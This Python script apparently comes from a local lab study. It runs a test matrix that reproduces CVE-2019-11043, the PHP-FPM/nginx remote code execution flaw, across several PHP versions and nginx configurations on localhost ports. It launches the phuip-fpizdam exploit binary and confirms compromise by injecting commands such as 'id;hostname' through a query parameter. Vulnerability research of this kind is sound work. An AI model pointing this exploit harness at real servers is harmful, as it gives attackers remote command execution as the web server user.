#!/usr/bin/env python3
"""Lean CVE-2019-11043 matrix: incremental JSONL, worker-retry RCE verification."""
import json, os, subprocess, time, urllib.parse

R = "/tmp/opencode/research/fpm_alt_rce_20261023T084957Z"
POC = os.path.join(R, "poc/phuip-fpizdam.bin")
OUT = os.path.join(R, "raw")
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "matrix.jsonl")

V = [("7123", "7.1.32"), ("7223", "7.2.23"), ("7224", "7.2.24"),
     ("7310", "7.3.10"), ("7311", "7.3.11"), ("7433", "7.4.33"), ("8426", "8.4.26")]
BP = {"7123": 29421, "7223": 29422, "7224": 29423, "7310": 29424,
      "7311": 29425, "7433": 29426, "8426": 29427}
AP = {"7123": 29451, "7223": 29452, "7224": 29453, "7310": 29454,
      "7311": 29455, "7433": 29456, "8426": 29457}

CASES = []
for tag, ver in V:
    CASES.append((f"A_tryfiles_{ver}", AP[tag], "A", ver))
for tag, ver in V:
    CASES.append((f"B_notryfiles_{ver}", BP[tag], "B", ver))
CASES += [("C1_stock_default", 29431, "C1", "n/a"),
          ("C2_nosplit", 29432, "C2", "7.2.23"),
          ("C3_distro_snippet_7.1.32", 29433, "C3", "7.1.32"),
          ("C3_distro_snippet_7.2.23", 29434, "C3", "7.2.23"),
          ("C3_distro_snippet_7.3.10", 29435, "C3", "7.3.10")]
for tag, ver in [("7123", "7.1.32"), ("7223", "7.2.23"), ("7310", "7.3.10")]:
    CASES.append((f"D_nginx117_{ver}", {"7123": 29441, "7223": 29442, "7310": 29443}[tag], "D", ver))

def curl(url, timeout=10):
    p = subprocess.run(["curl", "-sS", "--max-time", str(timeout), "-o", "-", "-w", "\n__CODE__%{http_code}", url],
                       capture_output=True, text=True)
    body, _, code = p.stdout.rpartition("\n__CODE__")
    return code.strip() or "000", body

def verify_uid(port, tries=40):
    for i in range(tries):
        code, body = curl(f"http://127.0.0.1:{port}/index.php?a=id", 5)
        if "uid=33(www-data)" in body:
            return i + 1, next(l.strip() for l in body.splitlines() if l.startswith("uid="))
    return None, ""

def run(cmd, timeout):
    t0 = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout + p.stderr, time.time() - t0
    except subprocess.TimeoutExpired as e:
        return 124, (e.stdout or "") + (e.stderr or "") + "\n[TIMEOUT-CLEANUP-PHASE]", time.time() - t0

def main():
    open(JSONL, "w").close()
    for name, port, cls, ver in CASES:
        url = f"http://127.0.0.1:{port}/index.php"
        rec = dict(case=name, port=port, config_class=cls, php=ver)
        code, body = curl(url)
        rec["baseline_code"] = code
        rec["baseline_body"] = body.strip()[:60]
        if code != "200":
            rec.update(verdict=f"{code} - no PHP execution path", rce=False)
            open(JSONL, "a").write(json.dumps(rec) + "\n"); print(name, rec["verdict"], flush=True); continue
        rc, out, dur = run([POC, "--only-qsl", url], 120)
        open(os.path.join(OUT, f"{name}_onlyqsl.log"), "w").write(out)
        rec["only_qsl_out"] = out.strip().replace("\n", " | ")[:400]
        if "probably vulnerable" not in out:
            rec.update(verdict="no QSL candidates (not vulnerable)", rce=False)
            open(JSONL, "a").write(json.dumps(rec) + "\n"); print(name, rec["verdict"], flush=True); continue
        att = os.path.join(OUT, f"{name}_attack.log")
        rc, out2, dur2 = run([POC, "--logfile", att, url], 90)
        rec["attack_rc"] = rc
        rec["attack_log"] = out2.strip().replace("\n", " | ")[:450]
        rec["attack_success"] = "Success!" in out2
        # free the stuck cleanup process (if any) by killing leftover children
        subprocess.run(["pkill", "-f", f"phuip-fpizdam.bin --logfile {att}"], capture_output=True)
        n, uid = verify_uid(port)
        rec["uid_after_n_requests"] = n
        rec["uid_line"] = uid
        rec["rce"] = bool(n)
        if n:
            q = urllib.parse.quote(f"id;hostname;echo FPMALT-PWN-{name}", safe="")
            c2, b2 = curl(url + "?a=" + q)
            rec["post_body"] = b2.strip()[:300]
            rec["verdict"] = "RCE as www-data (command + hostname executed)"
        else:
            rec["verdict"] = "attack phase success but uid not observed (worker rotation)"
        open(JSONL, "a").write(json.dumps(rec) + "\n")
        print(name, rec["verdict"], flush=True)

if __name__ == "__main__":
    main()
